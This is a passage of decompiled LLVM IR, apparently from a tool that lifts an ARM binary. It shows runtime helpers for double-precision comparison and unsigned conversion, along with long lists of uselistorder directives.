  uselistorder i32* @r3, { 153, 154, 48, 49, 155, 156, 9, 157, 158, 159, 160, 114, 161, 50, 163, 8, 164, 25, 26, 27, 28, 11, 165, 51, 162, 56, 166, 167, 186, 57, 59, 60, 115, 116, 117, 118, 119, 123, 124, 125, 126, 127, 128, 10, 52, 53, 54, 55, 195, 196, 3, 197, 198, 199, 4, 200, 201, 202, 5, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 0, 221, 222, 223, 224, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 58, 233, 234, 235, 231, 120, 107, 121, 122, 188, 189, 187, 129, 144, 61, 62, 63, 64, 65, 85, 130, 131, 132, 133, 134, 135, 136, 138, 2, 137, 7, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 145, 179, 180, 190, 191, 192, 193, 194, 139, 140, 6, 141, 142, 143, 14, 15, 16, 239, 236, 237, 238, 1, 240, 241, 242, 181, 182, 152, 66, 146, 147, 148, 149, 78, 150, 232, 67, 68, 12, 183, 184, 185, 69, 228, 229, 230, 225, 226, 227, 70, 71, 88, 89, 42, 43, 44, 45, 46, 47, 72, 73, 74, 75, 76, 77, 79, 80, 17, 18, 19, 20, 21, 22, 23, 24, 81, 82, 83, 84, 13, 86, 87, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 108, 109, 110, 111, 112, 113, 151 }
  uselistorder i32* @r1, { 422, 423, 23, 424, 425, 426, 427, 428, 45, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 82, 83, 46, 84, 85, 440, 6, 441, 442, 443, 444, 445, 446, 447, 22, 448, 449, 450, 451, 452, 453, 355, 356, 90, 91, 92, 93, 24, 454, 86, 87, 25, 32, 26, 88, 89, 457, 458, 459, 27, 94, 7, 95, 461, 357, 28, 462, 463, 121, 122, 96, 97, 98, 99, 100, 101, 102, 103, 29, 30, 61, 62, 63, 464, 104, 455, 456, 31, 105, 106, 107, 108, 460, 123, 124, 465, 33, 362, 466, 127, 363, 109, 110, 364, 129, 365, 366, 367, 370, 371, 372, 373, 374, 377, 378, 380, 381, 382, 383, 384, 385, 386, 387, 388, 16, 111, 112, 113, 114, 1, 115, 116, 117, 118, 119, 120, 37, 125, 126, 358, 269, 379, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 35, 361, 2, 359, 360, 128, 130, 142, 492, 508, 506, 507, 509, 528, 346, 64, 333, 510, 511, 368, 369, 516, 8, 375, 376, 9, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 505, 503, 10, 504, 519, 329, 330, 331, 332, 152, 38, 39, 40, 401, 402, 389, 390, 391, 400, 131, 132, 133, 134, 135, 136, 137, 49, 245, 11, 242, 243, 244, 138, 139, 140, 392, 393, 394, 312, 313, 65, 66, 67, 3, 4, 68, 69, 70, 71, 72, 73, 74, 75, 20, 76, 77, 403, 404, 405, 406, 480, 481, 482, 41, 42, 395, 396, 397, 398, 399, 12, 407, 408, 17, 409, 410, 411, 13, 339, 34, 14, 50, 51, 52, 53, 54, 55, 56, 15, 522, 523, 524, 525, 0, 526, 527, 483, 484, 485, 486, 18, 487, 488, 489, 43, 490, 421, 412, 201, 202, 44, 491, 21, 248, 141, 143, 144, 5, 36, 512, 467, 47, 517, 518, 48, 145, 146, 301, 302, 303, 304, 147, 148, 149, 153, 154, 520, 78, 79, 80, 211, 521, 19, 150, 151, 513, 514, 515, 81, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 203, 204, 205, 206, 207, 208, 209, 210, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 57, 58, 231, 232, 233, 234, 59, 60, 235, 236, 237, 238, 239, 240, 241, 246, 247, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 305, 306, 307, 308, 309, 310, 311, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 334, 335, 336, 337, 338, 340, 341, 342, 343, 344, 345, 347, 348, 349, 350, 351, 352, 353, 354, 413, 414, 415, 416, 417, 418, 419, 420 }
  uselistorder i32* @ip, { 160, 38, 39, 40, 161, 162, 163, 164, 165, 166, 167, 41, 72, 73, 74, 75, 76, 82, 83, 84, 45, 46, 169, 170, 2, 171, 47, 85, 86, 87, 88, 89, 90, 91, 99, 3, 107, 106, 110, 111, 112, 113, 114, 115, 116, 117, 118, 120, 121, 119, 122, 42, 43, 44, 79, 80, 15, 173, 172, 7, 174, 175, 8, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 11, 240, 241, 242, 243, 244, 245, 246, 247, 248, 81, 176, 177, 178, 179, 180, 19, 68, 92, 93, 4, 94, 95, 96, 97, 98, 155, 20, 251, 252, 253, 254, 12, 255, 256, 257, 100, 101, 102, 103, 104, 105, 203, 204, 205, 145, 123, 124, 125, 144, 48, 21, 146, 147, 13, 126, 14, 127, 128, 129, 130, 28, 29, 31, 30, 33, 32, 18, 16, 34, 148, 149, 181, 77, 78, 206, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 183, 182, 9, 262, 259, 260, 261, 10, 263, 22, 150, 0, 168, 108, 5, 109, 51, 6, 52, 185, 186, 187, 188, 189, 190, 191, 192, 184, 193, 194, 195, 196, 197, 198, 199, 200, 1, 201, 23, 49, 24, 151, 152, 153, 53, 54, 55, 159, 202, 249, 250, 156, 258, 25, 35, 36, 17, 157, 158, 26, 27, 50, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 154, 37 }
  uselistorder label %dec_label_pc_34f64, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_34f04, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_34f6c = load i32, i32* @r0, align 4
  %v0_34f70 = load i32, i32* @r2, align 4
  store i32 %v0_34f70, i32* @r0, align 4
  store i32 %v0_34f6c, i32* @r2, align 4
  %v0_34f84 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_34f84
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_34f88 = load i32, i32* @r0, align 4
  %v1_34f8c = sext i32 %v3_34f88 to i64
  %v2_34f8c = bitcast i64 %v1_34f8c to double
  %v3_34f8c = load i32, i32* @r2, align 4
  %v4_34f8c = sext i32 %v3_34f8c to i64
  %v5_34f8c = bitcast i64 %v4_34f8c to double
  %v7_34f8c = fcmp oeq double %v2_34f8c, %v5_34f8c
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_34f8c = fcmp ule double %v2_34f8c, %v5_34f8c
  %not.v7_34f8c = xor i1 %v7_34f8c, true
  %v1_34f90 = and i1 %not.v6_34f8c, %not.v7_34f8c
  store i1 %v7_34f8c, i1* @cpsr_z, align 1
  br i1 %v1_34f90, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_34f8c, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_34f88

; uselistorder directives
  uselistorder i1 %v7_34f8c, { 1, 2, 0 }
  uselistorder i32* @r2, { 21, 394, 395, 396, 397, 4, 398, 399, 400, 401, 402, 403, 15, 404, 349, 350, 51, 405, 52, 407, 408, 16, 53, 409, 17, 18, 410, 54, 406, 61, 411, 412, 413, 63, 353, 55, 56, 354, 355, 356, 357, 362, 363, 364, 365, 366, 367, 368, 57, 58, 59, 60, 20, 62, 19, 252, 13, 448, 449, 450, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 351, 352, 447, 459, 460, 461, 462, 3, 474, 358, 359, 5, 454, 6, 7, 360, 361, 8, 444, 445, 9, 446, 369, 370, 374, 64, 65, 66, 227, 67, 371, 372, 373, 294, 295, 32, 33, 2, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 375, 429, 430, 431, 432, 253, 14, 376, 12, 319, 463, 470, 471, 464, 465, 466, 467, 468, 469, 0, 1, 472, 10, 473, 433, 434, 435, 437, 436, 438, 439, 440, 441, 442, 392, 377, 378, 124, 125, 443, 379, 68, 69, 70, 71, 457, 458, 451, 452, 72, 73, 285, 286, 287, 288, 74, 75, 76, 11, 455, 456, 46, 47, 48, 49, 77, 453, 50, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 22, 23, 24, 25, 26, 216, 217, 218, 219, 27, 28, 29, 30, 31, 220, 221, 222, 223, 224, 225, 226, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 289, 290, 291, 292, 293, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 393 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_34fa4 = call i32 @__aeabi_cdcmple()
  %v0_34fa8 = load i1, i1* @cpsr_z, align 1
  %.v0_34fa4. = zext i1 %v0_34fa8 to i32
  ret i32 %.v0_34fa4.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_34fbc = call i32 @__aeabi_cdcmple()
  %v0_34fc0 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_34fc0 to i32
  %.v0_34fbc. = xor i32 %tmp2, 1
  ret i32 %.v0_34fbc.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_34fd4 = call i32 @__aeabi_cdcmple()
  %v0_34fd8 = load i1, i1* @cpsr_z, align 1
  %v1_34fd8 = load i1, i1* @cpsr_c, align 1
  %v2_34fd8 = xor i1 %v1_34fd8, true
  %v3_34fd8 = or i1 %v0_34fd8, %v2_34fd8
  %.v0_34fd4 = select i1 %v3_34fd8, i32 1, i32 %v0_34fd4
  %v2_34fdc = xor i1 %v0_34fd8, true
  %v3_34fdc = and i1 %v1_34fd8, %v2_34fdc
  %..v0_34fd4 = select i1 %v3_34fdc, i32 0, i32 %.v0_34fd4
  ret i32 %..v0_34fd4

; uselistorder directives
  uselistorder i1 %v1_34fd8, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_34fe8 = load i32, i32* @lr, align 4
  store i32 %v0_34fe8, i32* %stack_var_-8, align 4
  %v0_34fec = call i32 @__aeabi_cdrcmple()
  %v0_34ff0 = load i1, i1* @cpsr_z, align 1
  %v1_34ff0 = load i1, i1* @cpsr_c, align 1
  %v2_34ff0 = xor i1 %v1_34ff0, true
  %v3_34ff0 = or i1 %v0_34ff0, %v2_34ff0
  %.v0_34fec = select i1 %v3_34ff0, i32 1, i32 %v0_34fec
  %v2_34ff4 = xor i1 %v0_34ff0, true
  %v3_34ff4 = and i1 %v1_34ff0, %v2_34ff4
  %..v0_34fec = select i1 %v3_34ff4, i32 0, i32 %.v0_34fec
  %v2_34ff8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_34ff8, i32* @lr, align 4
  ret i32 %..v0_34fec

; uselistorder directives
  uselistorder i1 %v1_34ff0, { 1, 0 }
  uselistorder i1 true, { 3, 4, 5, 6, 0, 153, 1, 140, 7, 8, 9, 10, 11, 12, 130, 131, 141, 142, 132, 13, 14, 15, 133, 134, 135, 143, 144, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 32, 31, 30, 155, 156, 157, 158, 159, 160, 161, 136, 162, 163, 164, 148, 165, 166, 167, 168, 137, 169, 170, 171, 172, 173, 174, 175, 33, 176, 154, 177, 34, 35, 36, 37, 150, 40, 41, 42, 43, 38, 39, 151, 44, 45, 152, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 149, 71, 72, 73, 74, 75, 178, 179, 180, 181, 76, 77, 145, 182, 78, 79, 183, 80, 81, 2, 82, 83, 127, 84, 85, 86, 87, 128, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 129, 117, 118, 119, 120, 121, 146, 147, 122, 123, 138, 139, 124, 125, 126 }
  uselistorder i1* @cpsr_z, { 82, 77, 83, 84, 85, 86, 87, 88, 89, 90, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 91, 17, 18, 19, 20, 21, 22, 23, 24, 92, 93, 94, 95, 25, 26, 27, 28, 79, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 80, 47, 81, 48, 49, 50, 96, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 78, 71, 72, 73, 76, 74, 75 }
  uselistorder i32* @lr, { 227, 228, 229, 230, 231, 20, 21, 22, 23, 24, 232, 1, 233, 2, 234, 235, 236, 28, 29, 30, 31, 237, 238, 25, 26, 27, 32, 33, 34, 157, 158, 162, 163, 164, 165, 166, 167, 243, 244, 52, 53, 54, 245, 6, 246, 247, 248, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 48, 49, 50, 249, 250, 251, 252, 253, 257, 239, 240, 241, 242, 55, 56, 258, 259, 283, 260, 135, 136, 35, 36, 168, 169, 170, 171, 172, 173, 183, 184, 177, 185, 186, 187, 188, 189, 190, 191, 192, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 51, 284, 285, 286, 57, 58, 132, 309, 310, 311, 312, 313, 314, 315, 316, 317, 178, 179, 159, 160, 161, 261, 262, 263, 264, 265, 266, 267, 268, 269, 156, 59, 60, 318, 287, 303, 306, 307, 308, 304, 305, 148, 149, 150, 151, 152, 153, 219, 220, 221, 319, 334, 335, 320, 321, 323, 324, 325, 174, 175, 176, 288, 301, 302, 289, 290, 291, 292, 293, 294, 295, 3, 296, 297, 299, 300, 298, 61, 62, 63, 193, 194, 195, 203, 196, 197, 198, 199, 200, 201, 202, 143, 144, 145, 17, 204, 205, 254, 255, 256, 206, 207, 208, 180, 181, 182, 270, 271, 272, 273, 274, 275, 4, 5, 276, 277, 278, 279, 280, 64, 108, 109, 110, 111, 112, 113, 114, 281, 0, 282, 209, 210, 226, 80, 322, 65, 66, 326, 327, 330, 328, 329, 18, 67, 68, 331, 332, 333, 69, 70, 71, 72, 73, 74, 75, 19, 137, 141, 142, 138, 139, 140, 81, 82, 83, 76, 77, 78, 79, 84, 85, 86, 222, 223, 224, 225, 87, 91, 92, 93, 94, 88, 89, 90, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 133, 134, 146, 147, 154, 155, 211, 212, 213, 214, 215, 216, 217, 218 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_35004 = call i32 @__aeabi_cdrcmple()
  %v0_35008 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_35008 to i32
  %.v0_35004. = xor i32 %tmp2, 1
  ret i32 %.v0_35004.

; uselistorder directives
  uselistorder i32 1, {}
  uselistorder i1 false, { 40, 15, 16, 12, 17, 53, 54, 55, 56, 57, 58, 9, 10, 13, 59, 60, 61, 11, 41, 38, 42, 43, 44, 45, 46, 4, 0, 62, 1, 18, 19, 39, 2, 23, 24, 25, 47, 20, 22, 48, 49, 50, 51, 52, 35, 3, 5, 63, 21, 26, 31, 32, 33, 29, 28, 27, 30, 6, 7, 8, 14, 37, 34, 36, 64, 65, 66, 67 }
  uselistorder i1* @cpsr_c, { 2, 4, 3, 5, 6, 7, 0, 1 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_35018 = icmp slt i32 %arg2, 0
  %v2_35018 = mul i32 %arg2, 2
  br i1 %v1_35018, label %dec_label_pc_3504c, label %dec_label_pc_35020

dec_label_pc_35020:                               ; preds = %entry
  %v1_35020 = add i32 %v2_35018, 2097152
  %v2_35020 = icmp ugt i32 %v2_35018, -2097153
  br i1 %v2_35020, label %dec_label_pc_35054, label %dec_label_pc_35028

dec_label_pc_35028:                               ; preds = %dec_label_pc_35020
  %v6_35020 = icmp slt i32 %v1_35020, 0
  br i1 %v6_35020, label %dec_label_pc_3502c, label %dec_label_pc_3504c

dec_label_pc_3502c:                               ; preds = %dec_label_pc_35028
  %v4_35030 = sdiv i32 %v1_35020, 2097152
  %v5_35030 = sub nsw i32 -993, %v4_35030
  %v11_35030 = icmp slt i32 %v5_35030, 0
  br i1 %v11_35030, label %dec_label_pc_3505c, label %dec_label_pc_35038

dec_label_pc_35038:                               ; preds = %dec_label_pc_3502c
  %v3_35038 = mul i32 %arg2, 2048
  %v4_35040 = udiv i32 %arg1, 2097152
  %v1_3503c = or i32 %v4_35040, %v3_35038
  %v5_35040 = or i32 %v1_3503c, -2147483648
  %v6_35044 = lshr i32 %v5_35040, %v5_35030
  ret i32 %v6_35044

dec_label_pc_3504c:                               ; preds = %dec_label_pc_35028, %entry
  ret i32 0

dec_label_pc_35054:                               ; preds = %dec_label_pc_35020
  %v4_35054 = mul i32 %arg2, 4096
  %v5_35054 = or i32 %v4_35054, %arg1
  %v7_35054 = icmp eq i32 %v5_35054, 0
  br i1 %v7_35054, label %dec_label_pc_3505c, label %dec_label_pc_35064

dec_label_pc_3505c:                               ; preds = %dec_label_pc_35054, %dec_label_pc_3502c
  ret i32 -1

dec_label_pc_35064:                               ; preds = %dec_label_pc_35054
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 63, 428, 264, 265, 66, 67, 64, 65, 266, 68, 1, 267, 268, 269, 270, 2, 271, 272, 3, 4, 114, 273, 218, 518, 274, 115, 487, 103, 519, 219, 489, 116, 490, 207, 522, 523, 275, 276, 200, 5, 6, 220, 524, 277, 221, 491, 117, 527, 278, 528, 529, 433, 434, 435, 118, 436, 493, 494, 7, 437, 279, 495, 280, 281, 201, 282, 214, 119, 8, 283, 499, 104, 105, 500, 284, 208, 285, 210, 286, 9, 287, 213, 212, 503, 504, 86, 87, 88, 89, 92, 106, 288, 222, 429, 10, 430, 289, 11, 69, 70, 431, 290, 202, 120, 432, 71, 72, 530, 291, 112, 73, 292, 531, 74, 12, 75, 293, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 294, 497, 498, 295, 121, 532, 297, 533, 534, 113, 107, 108, 535, 536, 537, 538, 539, 215, 122, 540, 216, 13, 296, 109, 110, 298, 541, 542, 543, 299, 223, 224, 544, 300, 14, 301, 545, 546, 225, 488, 302, 16, 15, 303, 304, 17, 438, 305, 123, 101, 577, 124, 439, 125, 126, 475, 127, 482, 18, 128, 19, 483, 20, 306, 307, 308, 309, 578, 95, 496, 227, 226, 129, 440, 98, 310, 130, 441, 311, 21, 312, 22, 313, 228, 558, 26, 314, 315, 25, 27, 559, 24, 316, 317, 76, 23, 318, 77, 78, 79, 80, 319, 320, 321, 91, 484, 485, 28, 465, 581, 476, 131, 557, 132, 133, 486, 134, 442, 135, 502, 136, 443, 137, 444, 138, 513, 139, 514, 140, 141, 505, 142, 521, 143, 515, 506, 507, 322, 445, 446, 323, 94, 144, 447, 96, 324, 29, 30, 102, 448, 31, 32, 33, 146, 150, 145, 147, 198, 199, 151, 149, 148, 229, 449, 152, 153, 481, 325, 38, 37, 36, 35, 34, 547, 326, 81, 82, 327, 328, 329, 330, 331, 332, 333, 154, 334, 335, 336, 230, 155, 508, 337, 509, 338, 39, 339, 203, 156, 510, 340, 548, 341, 342, 549, 550, 83, 551, 552, 111, 553, 343, 344, 206, 217, 209, 554, 40, 345, 555, 346, 97, 41, 84, 90, 93, 347, 85, 231, 232, 511, 512, 233, 526, 157, 525, 158, 587, 159, 579, 160, 556, 161, 450, 162, 582, 163, 580, 164, 471, 165, 473, 166, 583, 167, 451, 168, 589, 169, 520, 170, 584, 171, 461, 172, 492, 173, 477, 174, 474, 175, 585, 176, 516, 177, 452, 348, 349, 42, 43, 178, 350, 351, 44, 352, 179, 234, 180, 478, 181, 586, 182, 462, 183, 463, 184, 453, 185, 454, 186, 455, 187, 456, 188, 457, 189, 479, 190, 588, 191, 458, 192, 501, 193, 459, 194, 472, 195, 560, 561, 353, 354, 45, 355, 356, 235, 357, 358, 236, 359, 237, 466, 460, 360, 361, 46, 362, 363, 427, 364, 99, 365, 366, 47, 367, 480, 238, 517, 48, 368, 369, 464, 211, 49, 370, 100, 50, 239, 371, 51, 196, 372, 467, 468, 240, 373, 242, 241, 374, 243, 375, 469, 197, 52, 53, 376, 470, 244, 204, 377, 245, 378, 379, 380, 381, 382, 246, 383, 384, 385, 386, 387, 388, 54, 389, 390, 55, 56, 57, 391, 392, 393, 394, 395, 396, 397, 398, 58, 59, 399, 400, 401, 402, 403, 404, 405, 406, 407, 247, 248, 408, 409, 249, 250, 410, 251, 252, 253, 411, 254, 255, 256, 412, 413, 414, 257, 258, 415, 416, 259, 260, 261, 262, 263, 417, 205, 418, 419, 420, 421, 422, 423, 424, 60, 61, 62, 425, 426 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 30, 5, 6, 31, 7, 8, 9, 10, 32, 14, 46, 43, 15, 47, 16, 44, 19, 45, 17, 13, 33, 18, 11, 20, 21, 22, 34, 23, 24, 35, 25, 26, 36, 37, 38, 39, 40, 41, 42, 12, 27, 28, 29 }
  uselistorder i32 -2147483648, { 0, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 6, 7, 21, 22, 4, 2, 23, 24, 25, 26, 5, 3, 8, 9, 10 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 14, 15, 16, 17, 10, 8, 9, 11, 12, 13 }
  uselistorder i32 2097152, { 9, 10, 18, 0, 2, 3, 11, 12, 4, 5, 6, 13, 14, 15, 7, 8, 17, 1, 16 }
  uselistorder i32 2, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 438, 42, 43, 439, 440, 341, 342, 343, 441, 442, 340, 448, 188, 0, 449, 450, 408, 409, 410, 411, 412, 413, 138, 451, 189, 190, 314, 191, 315, 44, 178, 179, 452, 453, 454, 192, 355, 293, 444, 445, 344, 345, 443, 346, 347, 348, 349, 447, 350, 446, 193, 353, 455, 456, 45, 46, 195, 194, 196, 47, 354, 457, 458, 459, 294, 48, 351, 1, 197, 414, 49, 198, 415, 416, 417, 50, 199, 418, 419, 420, 180, 181, 357, 200, 423, 2, 425, 295, 296, 139, 201, 426, 51, 52, 352, 202, 53, 140, 141, 142, 477, 478, 160, 479, 480, 143, 481, 482, 424, 460, 135, 461, 462, 54, 55, 463, 464, 203, 204, 397, 205, 398, 206, 399, 207, 400, 208, 401, 57, 56, 483, 484, 3, 4, 5, 476, 209, 210, 58, 316, 157, 59, 144, 60, 61, 158, 356, 132, 62, 485, 159, 486, 63, 64, 487, 65, 66, 133, 421, 67, 68, 69, 422, 471, 70, 71, 72, 73, 161, 472, 473, 74, 75, 6, 297, 474, 76, 475, 434, 427, 431, 432, 433, 358, 187, 359, 360, 77, 78, 211, 361, 79, 362, 428, 429, 430, 80, 212, 391, 81, 298, 317, 318, 134, 82, 319, 83, 213, 320, 321, 84, 322, 323, 183, 324, 85, 325, 326, 86, 214, 327, 328, 182, 329, 330, 331, 332, 333, 334, 335, 336, 337, 87, 338, 339, 88, 299, 7, 89, 90, 91, 145, 146, 147, 163, 148, 164, 149, 150, 151, 152, 215, 153, 155, 154, 156, 300, 301, 302, 465, 466, 184, 92, 93, 94, 95, 96, 185, 467, 165, 162, 97, 468, 469, 470, 303, 98, 99, 435, 304, 100, 101, 102, 305, 103, 104, 105, 106, 107, 108, 306, 109, 110, 111, 112, 113, 114, 115, 216, 363, 307, 116, 117, 118, 119, 364, 120, 121, 217, 387, 292, 122, 365, 218, 219, 367, 366, 124, 125, 123, 220, 126, 221, 368, 127, 222, 223, 224, 369, 225, 226, 227, 228, 230, 308, 229, 309, 233, 231, 232, 310, 290, 234, 370, 236, 311, 235, 312, 238, 237, 313, 291, 371, 239, 372, 240, 373, 241, 242, 243, 128, 244, 245, 129, 246, 247, 166, 374, 248, 249, 377, 167, 375, 130, 376, 378, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 168, 263, 169, 264, 265, 379, 266, 170, 267, 380, 381, 382, 268, 171, 269, 383, 384, 270, 172, 271, 272, 385, 386, 136, 273, 173, 274, 388, 389, 390, 275, 174, 276, 186, 277, 392, 278, 175, 279, 393, 394, 280, 176, 281, 395, 396, 137, 402, 282, 403, 404, 405, 406, 177, 283, 407, 284, 285, 436, 131, 286, 287, 437, 288, 289 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_35070 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_35070)
  %v31_35078 = load i32, i32* @r0, align 4
  ret i32 %v31_35078

; uselistorder directives
  uselistorder i32* @r0, { 93, 740, 734, 735, 736, 737, 738, 739, 94, 35, 741, 145, 742, 7, 146, 743, 744, 143, 147, 745, 95, 36, 746, 747, 748, 749, 224, 97, 225, 226, 98, 99, 750, 751, 752, 753, 754, 755, 31, 756, 757, 100, 758, 8, 652, 654, 165, 653, 2, 234, 149, 101, 235, 236, 37, 38, 227, 228, 229, 39, 761, 56, 230, 40, 231, 232, 233, 41, 762, 763, 764, 768, 42, 237, 238, 774, 43, 666, 775, 776, 44, 45, 46, 265, 266, 267, 268, 47, 239, 240, 241, 242, 243, 48, 191, 9, 244, 245, 246, 49, 172, 777, 50, 192, 193, 51, 194, 195, 196, 52, 778, 779, 53, 759, 760, 54, 247, 248, 55, 249, 250, 251, 252, 253, 254, 57, 769, 770, 771, 772, 773, 58, 765, 766, 767, 269, 780, 62, 667, 781, 782, 270, 668, 255, 256, 271, 257, 669, 670, 671, 672, 673, 674, 675, 676, 677, 679, 680, 681, 685, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 168, 697, 258, 259, 260, 261, 262, 263, 264, 821, 822, 59, 17, 60, 828, 18, 61, 19, 20, 656, 3, 657, 504, 505, 506, 10, 686, 64, 783, 784, 785, 140, 141, 786, 787, 788, 142, 789, 790, 791, 65, 792, 793, 795, 796, 66, 91, 655, 658, 659, 660, 661, 662, 663, 664, 665, 67, 68, 272, 273, 274, 69, 70, 71, 620, 622, 73, 74, 75, 621, 163, 829, 830, 831, 832, 833, 834, 835, 34, 836, 837, 175, 176, 180, 181, 182, 183, 184, 185, 861, 76, 77, 78, 197, 198, 838, 678, 79, 724, 725, 726, 727, 275, 840, 276, 845, 80, 177, 178, 841, 11, 842, 843, 844, 682, 166, 683, 684, 167, 81, 174, 823, 824, 825, 826, 827, 846, 623, 624, 625, 626, 335, 710, 698, 699, 700, 701, 702, 703, 277, 278, 279, 280, 281, 282, 283, 284, 82, 449, 285, 286, 704, 705, 706, 707, 709, 708, 21, 585, 